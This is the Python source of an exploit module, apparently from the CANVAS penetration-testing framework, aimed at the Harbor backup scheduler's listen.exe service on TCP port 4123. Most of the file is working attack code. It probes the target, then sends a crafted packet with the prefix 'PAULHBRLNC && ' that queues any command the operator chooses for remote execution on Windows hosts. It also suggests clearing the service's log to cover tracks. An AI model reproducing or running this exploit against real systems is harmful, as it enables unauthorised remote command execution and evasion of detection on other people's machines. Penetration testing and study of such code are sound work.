#! /usr/bin/env python

"""
 CANVAS harbor listen.exe exploit
 
 Harbor (tantia) is a backup scheduling program. It got sold to betasystems.com
 and appears to still be in use in many cases. This isn't an overflow, so
 it should be fairly reliable if the service is actually running. Unsure
 if the test() actually works. 
 
 We're attacking the Remote Initiation Scheduler.
 
 Found by Dave Aitel, Nov 28, 2003.
 
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time


NAME="harbor listen.exe"
DESCRIPTION="Harbor Listen.exe"
DOCUMENTATION={}
DOCUMENTATION["Logs"]="Leaves logs in c:\harbor\ets.log and c:\harbor\JOBSOUT\* and pops up a cmd.exe screen when it runs"
DOCUMENTATION["FoundBy"]="Dave Aitel"
DOCUMENTATION["DatePublic"]="02/11/2004"
DOCUMENTATION["Reliability"]="Infinite"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

NOTES="""
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=4123
        self.host=""
        self.shellcode="\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring="%\x00\x0a\x0d&? "
        self.badstring=self.searchbadstring
        self.ssl=0
        self.setVersions()
        self.version=1
        self.command="hi" #you'll always want to change this
        
        self.name=NAME        
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #only one version so far - all that should be needed forever.
        self.versions[1]=("Harbor 5.2",None)

    
    def test(self):
        """
        Connect to the remote host and get the version from it, if possible
        
        """
        #first there are two bytes of information (netbios header?)
        #these two bytes go directly into ntohs
        #must be less than or equal to 0x0100
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        teststring=intel_short(0x100)
        s=self.gettcpsock()
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
       
        s.send(teststring)
        #the only valid first byte is 0x01, then there are two more size bytes
        #as an intel_short()??(is this a byte?) with a max value of 0x100(?) 
        #I think this second size gets sign extended from two bytes?
        #It tries to read all that data into the heap?
        #well, in any case, it's not intel_short, it's actually big_short
        #with a top range of 256 (which is bypassed with a negative number, it seems)
        #0x100 is longest we could do, but it doesn't seem to do anything bad.
        
        #first four characters are ignored?!?
        commandstr="PAULHBRLNC && "+"yo"
        #trasm packet has a header of 0x01 0x01 and then a command string
        transm="\x01\x01"+commandstr
        s.send("\x01"+big_short(len(transm)))
        data=s.recv(6) #recv something
        self.log("received: "+prettyprint(data))
        if data=="\x00\x06\x81\x00\x00\x00":
            return 1 #vulnerable! :>
        #otherwise....
        return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.command=self.argsDict.get("command",self.command)
        #first there are two bytes of information (netbios header?)
        #these two bytes go directly into ntohs
        #must be less than or equal to 0x0100
        self.setInfo("%s attacking %s:%d - (in progress)"%(NAME,self.host,self.port))

        teststring=intel_short(0x100)
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            self.log("No connection could be established")
            return 0
        command=self.command
        s.send(teststring)
        #the only valid first byte is 0x01, then there are two more size bytes
        #as an intel_short()??(is this a byte?) with a max value of 0x100(?) 
        #I think this second size gets sign extended from two bytes?
        #It tries to read all that data into the heap?
        #well, in any case, it's not intel_short, it's actually big_short
        #with a top range of 256 (which is bypassed with a negative number, it seems)
        #0x100 is longest we could do, but it doesn't seem to do anything bad.
        
        #first four characters are ignored?!?
        commandstr="PAULHBRLNC && "+command
        #trasm packet has a header of 0x01 0x01 and then a command string
        self.log("Attempting to queue command %s"%command)
        transm="\x01\x01"+commandstr
        s.sendall("\x01"+big_short(len(transm)))
        try:
            data=s.recv(6) #recv something
        except:
            #print "Harborlisten patched"
            self.log("Socket was closed - service is patched!")
            self.log("Exploitation appears not to have been successful.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        self.log("received: "+prettyprint(data))
        
        #Send do_Transm query
        #1 and 1 are the only valid values for these headers
        #valid strings appear to be "HARBOR" "PAUL " "USER=" "HFT" "HBRMSX"
        #"HBRLNC" "HBR"
        s.sendall(transm)
        
        #+"A"*(0x0100-3)) #send the handshake itself...0 byte handshakes
        #are accepted apparantly?
        #then it sets a so_linger option on the socket
        #while 1:
        #    s.set_timeout(50)
        #    data=s.recv(20)
        time.sleep(5)

        self.log("Your command was queued! Give it some time...")
        self.log("You may want to clean up c:\HARBOR\ets.log")
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        return 1
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    standard_callback_commandline(app)
